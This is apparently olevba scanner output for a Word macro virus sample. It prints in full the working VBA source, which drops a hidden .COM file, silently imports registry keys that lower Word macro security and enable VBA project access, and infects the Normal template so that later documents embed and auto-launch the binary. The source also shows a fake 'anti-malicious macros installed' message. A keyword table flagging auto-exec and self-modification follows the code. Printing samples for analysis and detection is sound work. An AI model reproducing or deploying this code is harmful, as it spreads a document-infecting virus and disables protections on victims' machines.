olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.SecDown-e58107105e191acc063bb00711211e2d24a9a955
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.SecDown-e58107105e191acc063bb00711211e2d24a9a955 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.SecDown-e58107105e191acc063bb00711211e2d24a9a955 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Sub Main()
On Error Resume Next
Dim zz, zz1, file, fso, oword, nt, b, i, iw, attr
zz = App.path & App.EXEName & ".COM"
zz1 = App.path & "\" & App.EXEName & ".COM"
file = "c:\click2X.com"
FileCopy zz, file
FileCopy zz1, file
attr = GetAttr("c:\click2X.com")
If attr <> 3 Then
SetAttr "c:\click2X.com", vbHidden + vbReadOnly
End If
Open "c:\v.reg" For Output As 2
Print #2, "REGEDIT4"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, """AccessVBOM""=dword:00000001"
Close 2
Shell "regedit /s c:\v.reg", vbHide
Kill "c:\v.reg"
If dir("c:\normal.tmp") <> "normal.tmp" Then
Open "c:\normal.tmp" For Output As 9
Print #9, "Sub document_close()"
Print #9, "On Error Resume Next"
Print #9, "Open ""c:\xploit.txt"" For Output As 2"
Print #9, "Print #2, ""sub document_open()"""
Print #9, "Print #2, ""On Error Resume Next"""
Print #9, "Print #2, ""'by alcopaul"""
Print #9, "Print #2, ""obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"""
Print #9, "Print #2, ""With ActiveDocument.Shapes(1).OLEFormat"""
Print #9, "Print #2, ""    .ActivateAs ClassType:=obj"""
Print #9, "Print #2, ""    .Activate"""
Print #9, "Print #2, ""End With"""
Print #9, "Print #2, ""end sub"""
Print #9, "Close 2"
Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #9, "Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule"
Print #9, "Set iw = fso.OpenTextFile(""c:\xploit.txt"", 1, True)"
Print #9, "nt.DeleteLines 1, nt.CountOfLines"
Print #9, "i = 1"
Print #9, "Do While iw.atendofstream <> True"
Print #9, "b = iw.readline"
Print #9, "nt.InsertLines i, b"
Print #9, "i = i + 1"
Print #9, "Loop"
Print #9, "ActiveDocument.Shapes.AddOLEObject _"
Print #9, "FileName:=""c:\click2X.com"", _"
Print #9, "LinkToFile:=False"
Print #9, "ActiveDocument.Save"
Print #9, "Open ""c:\vv.reg"" For Output As 3"
Print #9, "Print #3, ""REGEDIT4"""
Print #9, "Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"""
Print #9, "Print #3, """"""Level""""=dword:00000001"""
Print #9, "Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"""
Print #9, "Print #3, """"""Level""""=dword:00000001"""
Print #9, "Print #3, """"""AccessVBOM""""=dword:00000001"""
Print #9, "Close 3"
Print #9, "Shell ""regedit /s c:\vv.reg"", vbHide"
Print #9, "Kill ""c:\vv.reg"""
Print #9, "End Sub"
Close 9
Set fso = CreateObject("Scripting.FileSystemObject")
Set oword = CreateObject("Word.Application")
oword.Visible = False
Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\normal.tmp", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
SetAttr oword.NormalTemplate.Fullname, vbReadOnly
oword.NormalTemplate.Close
MsgBox "anti-malicious macros version 1.0 installed", vbSystemModal, "Microsoft Word"
End If
End Sub
'anti-macros by alcopaul
'a binary virus for word documents
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |v.reg               |Executable file name                         |
|IOC       |vv.reg              |Executable file name                         |
+----------+--------------------+---------------------------------------------+
